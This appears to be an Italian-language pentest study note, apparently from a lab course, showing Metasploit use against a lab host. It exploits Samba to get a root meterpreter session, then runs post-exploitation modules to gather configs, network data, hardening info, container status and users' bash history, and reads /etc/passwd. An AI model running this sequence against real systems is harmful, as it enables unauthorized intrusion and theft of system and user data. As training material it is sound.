# Linux Post Exploitation Modules

<figure><img src="../../../../.gitbook/assets/image (1213).png" alt=""><figcaption></figcaption></figure>

## Accesso iniziale al target

```
service postgresql start && msfconsole
workspace -a Linux_PE
setg RHOSTS 192.112.165.3
db_nmap -sV 192.112.165.3
search type:exploit samba
use exploit/linux/samba/is_known_pipename
show options
exploit
pwd
CTRL+Z
sessions
sessions -u 1 //upgrade da shell a meterpreter
sessions
sessions 2 //entriamo in quella meterpreter che è stata creata
sysinfo
getuid //siamo root user
```

<figure><img src="../../../../.gitbook/assets/image (1214).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Local enumeration

<pre class="language-shell"><code class="lang-shell"><strong>shell
</strong><strong>/bin/bash -i
</strong>whoami
cat /etc/passwd //listare account sul sistema
groups root // vedere i gruppi ai quali l'utente usato fa parte
cat /etc/*issue //Versione OS
uname -r //versione kernel
uname -a //hostname, versione kernel e info aggiuntive
ifconfig 
ip a s //network enumeration delle interfaccie sul sistema
netstat -antp //listare servizi che ascoltano sulle porte aperte
ps aux //processi sul sistema
env //variabili d'ambiente dell'utente
CTRL+C
sessions-u 1
sessions
</code></pre>

<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Moduli post exploitation di Meterpreter

### Elenca tutte le configurazioni di linux

```
search enum_configs
show options
set SESSION 3
run
//Tutti i file di configurazione che non danno errore vengono salvati nel DB
loot // Mostra tutti i file di configurazione salvati nel DB con un nome che spiega cos'è
cat /root/.msf4/loot /20211126230647_Linux_PE_......txt //faccio il cat ad esempio del file delle shell sul sistema
```

<figure><img src="../../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Environment Variables

```
search env platform:linux
use post/multi/gather/env
show options
set SESSION 3
run
```

<figure><img src="../../../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Network information

Raccoglie informazioni come ssh, routing table, network config, firewall config, DNS, if-up/if-down...

```
search enum_network
use post/linux/gather/enum
set SESSION 3
run
loot
```

<figure><img src="../../../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (15) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (16) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Con il file delle configurazioni DNS capiamo che il server è hostato in cloud su linode, quindi è una info in più.

### Sistemi di protezione: security features abilitate (hardening)

```
search enum_protections
use post/linux/gather/enum_protections
info
set SESSION 3
run
notes //le info sono state salvate in notes
```

<figure><img src="../../../../.gitbook/assets/image (17) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (18) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (19) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (20) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Informazioni sul sistema

```
search enum_system
use post/linux/gather/enum_system
show options
info
set SESSION 3
run
loot
```

<figure><img src="../../../../.gitbook/assets/image (21) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (22) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (23) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (24) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Listiamo tutti i pacchetti installati ad esempio:

<figure><img src="../../../../.gitbook/assets/image (25) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Info sul disco:

<figure><img src="../../../../.gitbook/assets/image (26) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Check VM or docker container

```
search checkcontainer
use post/linux/gather/checkcontainer
show options
set SESSION 3
run
```

<figure><img src="../../../../.gitbook/assets/image (27) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

è importante sapere se siamo in un docket container perché esistono diverse tecniche o exploit di breakout container che ci permettono di uscire dal container e arrivare alla macchina host.

```
search checkvm
use post/linux/gather/checkvm
show options
set SESSION 3
run
```

<figure><img src="../../../../.gitbook/assets/image (28) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Enum user history

```
search enum_user_history
use post/linux/gather/enum_users_history
set SESSION 3
run
loot
//cat file bash history di root
```

<figure><img src="../../../../.gitbook/assets/image (29) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (30) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Va a identificare tutti i file con la history dei comandi di tutti gli account, sia quelli di user account che i service account.

<figure><img src="../../../../.gitbook/assets/image (31) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (32) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
